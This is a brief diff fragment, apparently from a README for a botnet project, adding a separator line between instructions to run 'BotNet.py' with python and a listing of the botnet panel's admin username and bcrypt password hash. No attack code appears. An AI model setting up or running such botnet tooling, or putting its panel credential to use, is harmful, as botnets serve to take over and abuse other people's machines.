@@ -9,6 +9,7 @@
 -------
 +  run BotNet.py
    - python BotNet.py
+-------
 ###### username [\password\] panel botnet :
 `admin, $2a$08$QfkvbA/w73zbr9YfZR.p5uK7bvUnApFawguHSBxq7ualsjVywFzru`
 
